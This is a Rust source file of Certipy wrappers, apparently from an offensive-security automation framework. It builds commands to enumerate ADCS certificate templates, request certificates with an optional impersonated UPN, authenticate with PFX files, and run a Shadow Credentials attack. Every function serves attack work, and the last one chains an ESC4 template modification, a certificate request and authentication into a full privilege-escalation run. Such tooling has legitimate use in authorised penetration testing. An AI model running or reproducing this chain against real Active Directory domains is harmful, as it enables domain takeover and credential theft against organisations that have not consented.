//! ADCS / Certipy privilege escalation tool executors.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_bool, optional_str, required_str};
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Enumerate ADCS certificate templates and CAs using Certipy.
///
/// Required args: `username`, `domain`, `password`, `dc_ip`
/// Optional args: `vulnerable`
pub async fn certipy_find(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let vulnerable = optional_bool(args, "vulnerable").unwrap_or(false);

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("find")
        .flag("-u", user_at_domain)
        .flag("-p", password)
        .flag("-dc-ip", dc_ip)
        .arg("-text")
        .arg_if(vulnerable, "-vulnerable")
        .timeout_secs(120)
        .execute()
        .await
}

/// Request a certificate from an ADCS CA using Certipy.
///
/// Required args: `username`, `domain`, `password`, `ca`, `template`, `dc_ip`
/// Optional args: `upn`
pub async fn certipy_request(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let ca = required_str(args, "ca")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let upn = optional_str(args, "upn");

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("req")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .flag_opt("-upn", upn)
        .timeout_secs(120)
        .execute()
        .await
}

/// Authenticate with a PFX certificate using Certipy.
///
/// Required args: `pfx_path`, `dc_ip`, `domain`
pub async fn certipy_auth(args: &Value) -> Result<ToolOutput> {
    let pfx_path = required_str(args, "pfx_path")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let domain = required_str(args, "domain")?;

    CommandBuilder::new("certipy")
        .arg("auth")
        .flag("-pfx", pfx_path)
        .flag("-dc-ip", dc_ip)
        .flag("-domain", domain)
        .timeout_secs(120)
        .execute()
        .await
}

/// Perform Certipy Shadow Credentials attack (auto mode).
///
/// Required args: `username`, `domain`, `password`, `target`, `dc_ip`
pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let target = required_str(args, "target")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("shadow")
        .arg("auto")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-account", target)
        .flag("-dc-ip", dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

/// Modify a certificate template for ESC4 exploitation using Certipy.
///
/// Required args: `username`, `domain`, `password`, `template`, `dc_ip`
pub async fn certipy_template_esc4(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("template")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .arg("-save-old")
        .timeout_secs(120)
        .execute()
        .await
}

/// Run the full ESC4 exploitation chain: template modification -> cert
/// request -> authentication.
///
/// Required args: `username`, `domain`, `password`, `template`, `dc_ip`,
///                `ca`, `pfx_path`
/// Optional args: `upn`
pub async fn certipy_esc4_full_chain(args: &Value) -> Result<ToolOutput> {
    let template_output = certipy_template_esc4(args).await?;
    let request_output = certipy_request(args).await?;
    let auth_output = certipy_auth(args).await?;

    let combined_stdout = format!(
        "=== Step 1: Template Modification ===\n{}\n\
         === Step 2: Certificate Request ===\n{}\n\
         === Step 3: Authentication ===\n{}",
        template_output.stdout, request_output.stdout, auth_output.stdout
    );
    let combined_stderr = format!(
        "=== Step 1: Template Modification ===\n{}\n\
         === Step 2: Certificate Request ===\n{}\n\
         === Step 3: Authentication ===\n{}",
        template_output.stderr, request_output.stderr, auth_output.stderr
    );

    // The chain succeeds only if the final auth step succeeded.
    Ok(ToolOutput {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code: auth_output.exit_code,
        success: template_output.success && request_output.success && auth_output.success,
    })
}
